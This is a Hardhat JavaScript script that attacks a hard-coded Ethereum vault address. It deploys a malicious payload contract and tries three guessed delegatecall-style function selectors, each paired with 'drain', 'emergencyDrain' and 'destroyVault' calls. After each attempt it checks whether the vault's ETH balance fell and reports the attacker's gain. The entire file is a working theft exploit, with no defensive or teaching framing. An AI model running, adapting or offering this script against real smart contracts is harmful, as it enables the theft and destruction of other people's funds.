const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";

async function main() {
  console.log("\n🎯 DELEGATECALL EXPLOIT ATTACK");
  console.log("=====================================");
  
  const [attacker] = await ethers.getSigners();
  console.log("Attacker:", attacker.address);
  console.log("Target Vault:", VAULT_ADDRESS);
  
  // Get initial balances
  const vaultBalanceBefore = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 INITIAL STATE:");
  console.log("Vault Balance:", ethers.formatEther(vaultBalanceBefore), "ETH");
  console.log("Attacker Balance:", ethers.formatEther(attackerBalanceBefore), "ETH");
  
  // Get gas settings
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 3000000
  };
  
  console.log("\n🚀 Deploying malicious payload contract...");
  const DelegatecallPayload = await ethers.getContractFactory("DelegatecallPayload");
  const payload = await DelegatecallPayload.deploy(gasSettings);
  await payload.waitForDeployment();
  const payloadAddress = await payload.getAddress();
  console.log("Payload deployed at:", payloadAddress);
  
  // Known delegatecall function signatures
  const attacks = [
    {
      name: "delegatecall(address,bytes)",
      selector: "0x5b34b966",
      encode: (target, data) => ethers.AbiCoder.defaultAbiCoder().encode(["address", "bytes"], [target, data])
    },
    {
      name: "execute(address,uint256,bytes)",
      selector: "0x61461954", 
      encode: (target, data) => ethers.AbiCoder.defaultAbiCoder().encode(["address", "uint256", "bytes"], [target, 0, data])
    },
    {
      name: "proxy(address,bytes)",
      selector: "0x6b941366",
      encode: (target, data) => ethers.AbiCoder.defaultAbiCoder().encode(["address", "bytes"], [target, data])
    }
  ];
  
  // Attack functions to try
  const attackFunctions = [
    { name: "drain", data: payload.interface.encodeFunctionData("drain", [attacker.address]) },
    { name: "emergencyDrain", data: payload.interface.encodeFunctionData("emergencyDrain") },
    { name: "destroyVault", data: payload.interface.encodeFunctionData("destroyVault", [attacker.address]) }
  ];
  
  console.log("\n⚔️ Attempting delegatecall exploits...");
  
  for (const attack of attacks) {
    for (const func of attackFunctions) {
      try {
        console.log(`\n🔍 Trying ${attack.name} -> ${func.name}...`);
        
        const calldata = attack.selector + attack.encode(payloadAddress, func.data).slice(2);
        
        const tx = await attacker.sendTransaction({
          to: VAULT_ADDRESS,
          data: calldata,
          ...gasSettings
        });
        
        console.log("📤 Transaction sent:", tx.hash);
        const receipt = await tx.wait();
        console.log("✅ Transaction mined! Gas used:", receipt.gasUsed.toString());
        
        // Check if exploit worked
        const vaultBalanceNow = await ethers.provider.getBalance(VAULT_ADDRESS);
        if (vaultBalanceNow < vaultBalanceBefore) {
          console.log("🎉 EXPLOIT SUCCESSFUL! Drained:", ethers.formatEther(vaultBalanceBefore - vaultBalanceNow), "ETH");
          break;
        }
      } catch (error) {
        console.log(`❌ Failed: ${error.message.slice(0, 60)}...`);
      }
    }
  }
  
  // Final state
  const vaultBalanceAfter = await ethers.provider.getBalance(VAULT_ADDRESS);
  const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
  
  console.log("\n📊 FINAL STATE:");
  console.log("Vault Balance:", ethers.formatEther(vaultBalanceAfter), "ETH");
  console.log("Attacker Balance:", ethers.formatEther(attackerBalanceAfter), "ETH");
  
  const vaultLost = vaultBalanceBefore - vaultBalanceAfter;
  const attackerGained = attackerBalanceAfter - attackerBalanceBefore;
  
  console.log("\n💰 RESULTS:");
  console.log("Vault Lost:", ethers.formatEther(vaultLost), "ETH");
  console.log("Attacker Net Gain:", ethers.formatEther(attackerGained + vaultLost), "ETH");
  
  if (vaultLost > 0n) {
    console.log("\n🏆 DELEGATECALL EXPLOIT SUCCESSFUL!");
    console.log("Extracted", ethers.formatEther(vaultLost), "ETH from the vault!");
  } else {
    console.log("\n❌ Delegatecall exploit failed - vault balance unchanged");
  }
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
